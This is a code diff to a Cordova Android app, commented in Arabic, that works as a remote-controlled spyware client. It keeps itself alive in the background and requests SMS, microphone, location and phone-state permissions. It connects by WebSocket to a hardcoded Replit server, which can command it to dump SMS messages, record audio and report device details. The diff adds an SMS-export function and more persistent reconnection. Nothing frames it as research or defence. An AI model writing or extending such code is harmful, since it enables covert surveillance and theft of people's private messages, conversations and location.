@@ -1,18 +1,19 @@
+
 document.addEventListener('deviceready', onDeviceReady, false);
 
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
 
-// متغير لتخزين حالة الأذونات
-let permissionsGranted = false;
+// متغير لتخزين مدة التسجيل المحددة
+let recordingDuration = 10;
 
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // طلب الأذونات اللازمة
+  // طلب الأذونات اللازمة عند فتح التطبيق لأول مرة
   requestPermissions();
   
-  // تمكين التشغيل في الخلفية
+  // تمكين التشغيل في الخلفية مع إعدادات محسنة
   if (cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
@@ -21,13 +22,65 @@ function onDeviceReady() {
       silent: false
     });
     
-    // إعداد التشغيل التلقائي عند بدء التشغيل
+    // إعدادات إضافية لضمان عمل التطبيق في الخلفية
     cordova.plugins.backgroundMode.on('activate', function() {
       cordova.plugins.backgroundMode.disableWebViewOptimizations();
-      console.log('التطبيق يعمل في الخلفية');
+      cordova.plugins.backgroundMode.disableBatteryOptimizations();
+    });
+    
+    // إعادة الاتصال عند العودة من الخلفية
+    cordova.plugins.backgroundMode.on('deactivate', function() {
+      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
+        console.log('Reconnecting WebSocket after background mode');
+        initializeDeviceInfo();
+      }
     });
   }
 
+  // بدء تشغيل التطبيق
+  initializeDeviceInfo();
+}
+
+// طلب الأذونات اللازمة
+function requestPermissions() {
+  const permissions = [
+    'ACCESS_FINE_LOCATION',
+    'ACCESS_COARSE_LOCATION',
+    'RECORD_AUDIO',
+    'READ_SMS',
+    'RECEIVE_SMS',
+    'READ_PHONE_STATE',
+    'WAKE_LOCK',
+    'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS'
+  ];
+
+  permissions.forEach(permission => {
+    if (cordova.plugins.permissions) {
+      cordova.plugins.permissions.checkPermission(
+        permission,
+        function(status) {
+          if (!status.hasPermission) {
+            cordova.plugins.permissions.requestPermission(
+              permission,
+              function() {
+                console.log('Permission granted: ' + permission);
+              },
+              function() {
+                console.log('Permission denied: ' + permission);
+              }
+            );
+          }
+        },
+        function() {
+          console.log('Error checking permission: ' + permission);
+        }
+      );
+    }
+  });
+}
+
+// تهيئة معلومات الجهاز والاتصال
+function initializeDeviceInfo() {
   // معلومات الجهاز
   const deviceInfo = {
     uuid: device.uuid || generateUUID(),
@@ -93,42 +146,15 @@ function onDeviceReady() {
   }
 }
 
-// طلب الأذونات اللازمة
-function requestPermissions() {
-  const permissions = [
-    'ACCESS_FINE_LOCATION',
-    'RECORD_AUDIO',
-    'READ_SMS',
-    'WAKE_LOCK',
-    'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS'
-  ];
-  
-  permissions.forEach(permission => {
-    cordova.plugins.permissions.checkPermission(permission, 
-      function(success) {
-        if (!success.hasPermission) {
-          cordova.plugins.permissions.requestPermission(permission, 
-            function(result) {
-              console.log(`Permission ${permission}: ${result.hasPermission ? 'Granted' : 'Denied'}`);
-            }, 
-            function(error) {
-              console.error(`Error requesting ${permission}:`, error);
-            }
-          );
-        }
-      }, 
-      function(error) {
-        console.error(`Error checking ${permission}:`, error);
-      }
-    );
-  });
-  
-  permissionsGranted = true;
-}
-
 function connectToServer(deviceInfo) {
   // استخدام رابط الخادم المقدم
   const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
+  
+  // إغلاق الاتصال الحالي إذا كان موجوداً
+  if (window.wsConnection) {
+    window.wsConnection.close();
+  }
+  
   window.wsConnection = new WebSocket(wsUrl);
   
   wsConnection.onopen = () => {
@@ -184,7 +210,7 @@ function connectToServer(deviceInfo) {
   wsConnection.onclose = () => {
     console.log('Disconnected from server');
     // إعادة الاتصال بعد تأخير
-    setTimeout(() => connectToServer(deviceInfo), 10000);
+    setTimeout(() => initializeDeviceInfo(), 10000);
   };
   
   // إرسال نبضات قلبية دورية
@@ -215,7 +241,9 @@ function executeCommand(command, callback) {
       getSMS(commandId, callback);
       break;
     case 'record_audio':
-      recordAudio(commandId, command.duration, callback);
+      // استخدام المدة المحددة من الواجهة أو المدة الافتراضية
+      const duration = command.duration || recordingDuration;
+      recordAudio(commandId, duration, callback);
       break;
     case 'get_device_info':
       getDeviceInfo(commandId, callback);
@@ -223,8 +251,8 @@ function executeCommand(command, callback) {
     case 'get_received_requests':
       getReceivedRequests(commandId, callback);
       break;
-    case 'download_sms_txt':
-      downloadSMSTxt(commandId, callback);
+    case 'download_sms':
+      downloadSMS(commandId, callback);
       break;
     default:
       callback({ 
@@ -324,6 +352,42 @@ function getSMS(commandId, callback) {
   );
 }
 
+// دالة لتنزيل رسائل SMS كملف نصي
+function downloadSMS(commandId, callback) {
+  getSMS(commandId, (smsResponse) => {
+    if (smsResponse.status === 'success') {
+      // تحويل الرسائل إلى تنسيق نصي
+      let smsText = "رسائل SMS\n";
+      smsText += "==========\n\n";
+      
+      smsResponse.messages.forEach((msg, index) => {
+        smsText += `رسالة ${index + 1}:\n`;
+        smsText += `من: ${msg.address}\n`;
+        smsText += `التاريخ: ${new Date(msg.date).toLocaleString('ar-EG')}\n`;
+        smsText += `المحتوى: ${msg.body}\n`;
+        smsText += "------------------------\n\n";
+      });
+      
+      // إنشاء ملف نصي
+      const blob = new Blob([smsText], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      
+      callback({
+        commandId,
+        status: 'success',
+        file: {
+          type: 'text/plain',
+          size: blob.size,
+          downloadUrl: url,
+          fileName: `sms_messages_${commandId}.txt`
+        }
+      });
+    } else {
+      callback(smsResponse);
+    }
+  });
+}
+
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   
@@ -419,71 +483,11 @@ function getReceivedRequests(commandId, callback) {
   });
 }
 
-function downloadSMSTxt(commandId, callback) {
-  if (typeof SMS === 'undefined') {
-    return callback({ 
-      commandId,
-      status: 'error',
-      error: 'SMS plugin not available',
-      suggestion: 'Install cordova-sms-plugin'
-    });
-  }
-  
-  const filter = {
-    box: 'inbox',
-    maxCount: 1000,
-    indexFrom: 0
-  };
-  
-  SMS.listSMS(
-    filter,
-    (messages) => {
-      // تحويل الرسائل إلى تنسيق نصي
-      let txtContent = "رسائل SMS\n\n";
-      messages.forEach((msg, index) => {
-        txtContent += `رسالة ${index + 1}:\n`;
-        txtContent += `من: ${msg.address}\n`;
-        txtContent += `التاريخ: ${new Date(msg.date).toLocaleString('ar-EG')}\n`;
-        txtContent += `المحتوى: ${msg.body}\n`;
-        txtContent += "------------------------\n\n";
-      });
-      
-      // إنشاء ملف نصي
-      const blob = new Blob([txtContent], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      
-      callback({
-        commandId,
-        status: 'success',
-        file: {
-          type: 'txt',
-          content: txtContent,
-          downloadUrl: url,
-          fileName: `sms_messages_${commandId}.txt`,
-          count: messages.length
-        }
-      });
-    },
-    (error) => {
-      callback({ 
-        commandId,
-        status: 'error',
-        error: 'SMS error',
-        details: error
-      });
-    }
-  );
-}
-
 // إعادة الاتصال عند استئناف التطبيق
 document.addEventListener('resume', () => {
-  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-    console.log('App resumed, reconnecting...');
-    onDeviceReady();
-  }
+  console.log('App resumed, reconnecting...');
+  initializeDeviceInfo();
 }, false);
 
-// التأكد من استمرار عمل التطبيق في الخلفية
-document.addEventListener('pause', () => {
-  console.log('App is running in background');
-}, false);
+// بدء التشغيل التلقائي عند تشغيل الجهاز
+document.addEventListener('resume', onDeviceReady, false);
